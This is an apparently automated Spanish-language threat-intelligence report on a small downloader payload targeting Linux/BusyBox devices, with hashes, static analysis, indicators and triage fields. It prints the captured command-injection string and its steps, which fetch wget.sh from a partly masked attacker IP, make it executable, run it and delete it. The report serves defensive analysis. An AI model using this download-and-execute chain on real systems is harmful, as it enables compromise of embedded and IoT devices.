# 🧬 Payload Analysis

`f35c41f4b6b6c79f20011f8a3160eede952df68c2dea6fae94a5c182e61b2767`

## 📌 Resumen

Texto ASCII de 238 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.goahead`
5. `rm -f .s`
6. `cd /tmp`
7. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
8. `busybox wget hxxp://91.92.40.XXX/wget` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/f35c41f4b6b6c79f20011f8a3160eede952df68c2dea6fae94a5c182e61b2767.md](../../../../../malware-like/oraculo/downloader/f35c41f4b6b6c79f20011f8a3160eede952df68c2dea6fae94a5c182e61b2767.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f35c41f4b6b6c79f20011f8a3160eede952df68c2dea6fae94a5c182e61b2767`
- **SHA1:** `ac0c294f2952cafffbd67bf0aced460815122b15`
- **MD5:** `5e7b15a29d527d7857d99379735f2991`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 238 B |
| Entropía | 4.62 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
cmd=;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.goahead%3Brm%20-f%20.s | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | cmd=;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget | strings |
| hash | f35c41f4b6b6c79f20011f8a3160eede952df68c2dea6fae94a5c182e61b2767 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
